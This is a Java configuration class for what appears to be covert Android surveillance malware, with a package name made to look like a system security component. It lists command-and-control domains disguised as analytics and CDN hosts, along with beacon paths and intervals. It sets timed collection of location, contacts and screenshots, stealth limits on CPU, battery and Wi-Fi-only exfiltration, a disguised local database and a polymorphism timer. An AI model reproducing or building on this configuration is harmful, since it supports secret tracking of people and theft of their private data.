package com.android.system.security;

import java.util.*;

/**
 * Central configuration — tune for your testing environment.
 * All values are obfuscated at compile time by ProGuard.
 */
public final class Config {

    public static final String PACKAGE = "com.android.system.security";

    // C2
    public static final List<String> C2_DOMAINS = Arrays.asList(
        "api.analytics-cdn.com",
        "cdn-updates-static.net",
        "push-services-api.com"
    );
    public static final List<String> C2_PATHS = Arrays.asList(
        "/collect", "/beacon", "/heartbeat", "/config"
    );
    public static final int BEACON_INTERVAL_MS = 300_000;  // 5 min

    // Collection intervals
    public static final int LOCATION_INTERVAL_MS = 120_000;
    public static final int CONTACTS_INTERVAL_MS = 600_000;
    public static final int SCREENSHOT_INTERVAL_MS = 120_000;

    // Stealth
    public static final int MAX_CPU_PCT = 15;
    public static final int MIN_BATTERY_PCT = 20;
    public static final boolean WIFI_ONLY_EXFIL = true;

    // Crypto
    public static final String MASTER_KEY_ALIAS = "system_security_master_key";

    // Data storage
    public static final String DB_NAME = "system_cache.db";
    public static final String DB_DIR = "system_data";

    // Polymorphism
    public static final int POLYMORPHIC_INTERVAL_MS = 3_600_000;  // 1 hour

    private Config() {}
}
